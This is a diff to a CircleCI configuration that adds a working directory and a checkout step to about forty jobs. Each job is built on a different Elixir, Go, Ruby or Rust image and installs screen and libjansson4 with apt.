@@ -4,6 +4,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.9.1
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -19,6 +22,9 @@ jobs:
     docker:
       - image: circleci/golang:1.9.7
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -34,6 +40,9 @@ jobs:
     docker:
       - image: circleci/ruby:3.0.1-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -49,6 +58,9 @@ jobs:
     docker:
       - image: circleci/rust:1.53.0-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -64,6 +76,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.8.0
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -79,6 +94,9 @@ jobs:
     docker:
       - image: circleci/golang:1.9.4
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -94,6 +112,9 @@ jobs:
     docker:
       - image: circleci/ruby:3.0.0-rc1
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -109,6 +130,9 @@ jobs:
     docker:
       - image: circleci/rust:1.53-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -124,6 +148,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.7.4
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -139,6 +166,9 @@ jobs:
     docker:
       - image: circleci/golang:1.9.5-stretch
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -154,6 +184,9 @@ jobs:
     docker:
       - image: circleci/ruby:3.0-rc-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -169,6 +202,9 @@ jobs:
     docker:
       - image: circleci/rust:1.52.1-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -184,6 +220,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.7.1
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -199,6 +238,9 @@ jobs:
     docker:
       - image: circleci/golang:1.9.2-stretch
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -214,6 +256,9 @@ jobs:
     docker:
       - image: circleci/ruby:3.0
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -229,6 +274,9 @@ jobs:
     docker:
       - image: circleci/rust:1.51.0-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -244,6 +292,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.6.6
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -259,6 +310,9 @@ jobs:
     docker:
       - image: circleci/golang:1.9-rc
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -274,6 +328,9 @@ jobs:
     docker:
       - image: circleci/ruby:2.7.4-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -289,6 +346,9 @@ jobs:
     docker:
       - image: circleci/rust:1.49-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -304,6 +364,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.6.3
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -319,6 +382,9 @@ jobs:
     docker:
       - image: circleci/golang:1.8.7-jessie
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -334,6 +400,9 @@ jobs:
     docker:
       - image: circleci/ruby:2.7.3
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -349,6 +418,9 @@ jobs:
     docker:
       - image: circleci/rust:1.48.0
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -364,6 +436,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.5.2
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -379,6 +454,9 @@ jobs:
     docker:
       - image: circleci/golang:1.17-rc-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -394,6 +472,9 @@ jobs:
     docker:
       - image: circleci/ruby:2.7.1-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -409,6 +490,9 @@ jobs:
     docker:
       - image: circleci/rust:1.47
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -424,6 +508,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.4.5
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -439,6 +526,9 @@ jobs:
     docker:
       - image: circleci/golang:1.8.6
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -454,6 +544,9 @@ jobs:
     docker:
       - image: circleci/ruby:2.7.0-rc1
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -469,6 +562,9 @@ jobs:
     docker:
       - image: circleci/rust:1.45.2-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -484,6 +580,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.3
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -499,6 +598,9 @@ jobs:
     docker:
       - image: circleci/golang:1.8.5
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -514,6 +616,9 @@ jobs:
     docker:
       - image: circleci/ruby:2.6.8
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -529,6 +634,9 @@ jobs:
     docker:
       - image: circleci/rust:1.44.1-buster
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -544,6 +652,9 @@ jobs:
     docker:
       - image: circleci/elixir:1.12.2
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -559,6 +670,9 @@ jobs:
     docker:
       - image: circleci/golang:1.16.5
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -574,6 +688,9 @@ jobs:
     docker:
       - image: circleci/ruby:2.6.7
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
@@ -589,6 +706,9 @@ jobs:
     docker:
       - image: circleci/rust:1.43.1-stretch
 
+    working_directory: ~/repo
+    steps:
+      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
